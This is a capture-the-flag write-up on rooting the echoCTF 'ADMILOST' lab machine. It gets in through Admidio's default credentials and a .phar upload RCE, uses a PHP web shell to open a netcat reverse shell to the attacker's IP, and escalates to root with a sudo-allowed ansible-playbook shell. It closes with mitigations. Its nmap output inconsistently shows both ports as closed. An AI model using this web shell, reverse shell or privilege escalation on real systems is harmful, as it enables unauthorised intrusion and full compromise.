
![admin1](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin.png)

# Introduction

The **ADMILOST** machine presents a privilege escalation scenario based on a web application called **ADMIDIO**, which is exposed on the HTTP port and vulnerable to Remote Code Execution (RCE) via the upload of `.phar` files. Later, escalation to root is achieved thanks to a sudo binary configured to be executed without a password by the restricted user `www-data`.

___

# Reconnaissance and Scanning

We started the reconnaissance of the **Admilost** machine with a port scan using **rustscan**. The following command was used:

```python
❯ rustscan -a 10.0.160.243
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/sheepsstealer/snap/rustscan/436/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.0.160.243:22
Open 10.0.160.243:80
[~] Starting Script(s)
[!] Error Exit code = 127
```

Then we do a scan with `nmap` to verify the services running on those ports.

``` bash
nmap -sSC -vv --min-rate -p 22,80 10.0.160.243 

PORT    STATE  SERVICE  REASON
22/tcp  closed ssh      reset ttl 64
80/tcp  closed http     reset ttl 64
```
We notice that port 80 runs an HTTP service, so we can connect to it via a URL in a web browser.

____

# Initial Access to the Web Application

When attempting to access `http://10.0.160.243` in a browser, a DNS issue is detected:

```python
This site can’t be reached admilost.echocity-f.com’s DNS address could not be found.
```

### Local DNS Solution

We edit the `/etc/hosts` file to map the IP to the expected DNS name:

```bash
sudo nano /etc/hosts
# Once inside the file, add the following
10.0.160.243    admilost.echocity-f.com
```

Now that the DNS is configured in our local hosts, we can reload the page, which shows the following page.

![admin1](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/ADMIN1.png)

We notice that it has different actions, but they are all limited, so we try to log in to see if we can access as an admin and get additional functions.

### Default Credentials

* user: admin
* password: admin123

After logging in, we verify the exact version of ADMIDIO used, which is crucial for identifying potential public vulnerabilities.

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin4.png)

___

# Vulnerability Identification

A search in **Exploit Database** is done using `searchsploit`:

```bash
searchsploit admidio

❯ searchsploit admidio
----------------------------------------------------------------------
Exploit Title                                                                 | Path
----------------------------------------------------------------------
Admidio 1.4.8 - 'getfile.php' Remote File Disclosure                          | php/webapps/5575.txt
Admidio 2.3.5 - Multiple Vulnerabilities                                      | php/webapps/21005.txt
Admidio 3.2.8 - Cross-Site Request Forgery                                    | php/webapps/42005.txt
Admidio 3.3.5 - Cross-Site Request Forgery (Change Permissions)               | php/webapps/45322.txt
Admidio v4.2.10 - Remote Code Execution (RCE) <------------ This is the one   | php/webapps/51590.txt
Admidio v4.2.5 - CSV Injection                                                | php/webapps/51402.txt
----------------------------------------------------------------------

```

The results show multiple vulnerabilities for various versions, highlighting:

- **Admidio v4.2.10 – Remote Code Execution (RCE)**  
    Allows remote code execution via uploading `.phar` files in the announcements section.

___

# Exploiting RCE via File Upload

From the previous exploit, we get the following [Exploit and PoC](https://www.exploit-db.com/exploits/51590)

```txt
Exploit Title: Admidio v4.2.10 - Remote Code Execution (RCE)
Application: Admidio
Version: 4.2.10
Bugs:  RCE
Technology: PHP
Vendor URL: https://www.admidio.org/
Software Link: https://www.admidio.org/download.php
Date of found: 10.07.2023
Author: Mirabbas Ağalarov
Tested on: Linux
```

```python

2. Technical Details & POC
========================================
Steps:

3. Login to account
4. Go to Announcements
5. Add Entry
6. Upload .phar file in image upload section.
.phar file Content
<?php echo system('cat /etc/passwd');?>
5. Visit .phar file  ( http://localhost/admidio/adm_my_files/announcements/images/20230710-172217_430o3e5ma5dnuvhp.phar )
```

``` bash
www-data@admilost:~/html/adm_my_files/announcements/images$ sudo -l
Matching Defaults entries for www-data on admilost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on admilost:
    (ALL : ALL) NOPASSWD: /usr/local/bin/templater
```

Following the previous example, we upload a `.php` file with the following shell inside:

```php
<?php system($_GET['cmd']); ?>
```

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin5.png)

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin6.png)

After uploading the image, we send it to the server to get its URL with the file ID.

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin7.png)

At this point, it's important to copy the endpoint referring to our file and paste it into the following URL.

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin8.png)

```c
http://admilost.echocity-f.com/adm_my_files/announcements/images/20250531-061003_9rqlec91aaryzd6y.php
```

___

# Intrusion

We set up a listener on our attacking machine to receive a reverse connection.

```bash
nc -lvnp 4444
```

In the URL, we access with a parameter that triggers a Reverse Shell to our machine:

```
http://admilost.echocity-f.com/adm_my_files/announcements/images/20250531-061003_9rqlec91aaryzd6y.php?cmd=nc 10.10.6.42 4444 -e /bin/bash
```

This will establish a connection with our remote shell listening.

To improve interaction, we adjust the remote terminal:

```bash
script /dev/null -c bash
# Ctrl+Z to suspend
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=bash
```

___

# Privilege Enumeration and Escalation

We run `sudo -l` to see if there are any binaries that can be executed with sudo without a password.

```bash
Matching Defaults entries for www-data on admilost:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on admilost:

(ALL : ALL) NOPASSWD: /usr/local/bin/templater
```

Inside this file, there is a binary that can be exploited. We proceed to `cat` it to view its contents.

```bash
#!/usr/bin/env ansible-playbook

---

- name: Parse templates

hosts: all

gather_facts: false

serial: 1

connection: local

tasks:

- name: Generate template data

template:

src: /etc/template.j2

dest: /tmp/template.out

www-
```

We can search in [CTFOBINS](https://gtfobins.github.io/gtfobins/ansible-playbook/) for a way to exploit this binary for privilege escalation.

By executing Ansible Playbooks with root permissions and no restrictions, we can create a malicious playbook that runs a root shell:

```bash
TF=$(mktemp)
cat << EOF > $TF
- hosts: localhost
  gather_facts: no
  tasks:
    - name: Execute root shell
      shell: /bin/sh
      stdin_open: yes
      tty: yes
EOF
```

Once the file is created, we execute the binary:

```bash
sudo /usr/local/bin/templater $TF
```

Result:

```bash
PLAY [localhost] ***************************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [Execute root shell] *****************************************************
# whoami
root
#

```

___

# Flag Retrieval

With root privileges, we search the entire system for files containing CTF flags:

```bash
bash -p
cd /
grep -rlE "ETSCTF_[0-9a-f]+" --exclude-dir=proc --exclude-dir=dev 2>/dev/null | xargs strings | cat - <(strings /proc/*/environ 2> /dev/null) | cat - <(find / -name "ETSCTF_*" 2> /dev/null) | grep -oE "ETSCTF_[0-9a-f]+" | sort | uniq

```

Result:

```bash
ETSCTF_SheepsStealer_was_here:D
ETSCTF_SheepsStealer_was_here:D
ETSCTF_SheepsStealer_was_here:D
ETSCTF_SheepsStealer_was_here:D

```

___

# Vulnerability Identification

|Vulnerability|Description|Impact|
|---|---|---|
|Insecure file upload (`.phar`)|Lack of validation and sanitization of files in the announcements section, allowing RCE.|Allows remote code execution under `www-data` user.|
|Unrestricted execution of Ansible Playbooks with sudo|The binary `/usr/local/bin/templater` can be executed with root privileges without a password.|Direct escalation to root without needing a password.|
|Exposed default credentials|Use of default credentials for initial access.|Facilitates initial access without needing exploitation.|

# Risk Mitigation

- Implement strict validation and sanitization on file uploads, restricting dangerous types like `.phar` and `.php`.
- Restrict sudo usage for non-privileged users, especially avoiding passwordless execution of binaries with root privileges.
- Audit and secure playbooks and scripts executed with elevated privileges to prevent arbitrary execution.
- Change default credentials and apply strong password policies.
- Implement monitoring and alerts for suspicious access or unusual command executions on critical servers.

~~~~ Writeup by sheeps stealer ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
